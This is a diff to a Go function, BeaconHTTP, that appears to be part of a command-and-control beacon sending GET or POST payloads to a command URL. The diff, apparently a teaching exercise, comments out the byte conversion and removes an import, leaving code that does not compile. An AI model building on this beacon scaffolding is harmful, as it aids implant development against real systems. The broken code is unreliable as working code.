@@ -6,7 +6,6 @@ package shared_code
 
 import (
 	"bufio"
-	"bytes"
 	"encoding/json"
 	"fmt"
 	"net"
@@ -67,17 +66,27 @@ func BeaconHTTP(command_url string, request_type string) (*http.Response, error)
 		}
 		return http_response, derp
 	case "post":
+		//  POST requests are pushing data to the server
+		// they POST data to a source, instead of GETting it!
+		// GET it?
 		post_body, derp := json.Marshal(BEACONPOSTPAYLOAD)
 		if derp != nil {
 			Error_printer(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
 		}
-		http_response, derp := http.Post(command_url, "text/html", bytes.NewBuffer(post_body))
+		// but this function we are using takes bytes!
+		// so you need a line of code like THIS!!
+		// to turn text to bytes!
+		// post_body_bytes := bytes.NewBuffer(post_body)
+		http_response, derp := http.Post(command_url, "text/html", post_body_bytes)
 		if derp != nil {
 			Error_printer(derp, "[-] Beacon POST failed to connect to command, stopping beacon")
 			return http_response, derp
+
 		}
+		return http_response, derp
 	}
-	return
+	return http_response, derp
+
 }
 
 /*/
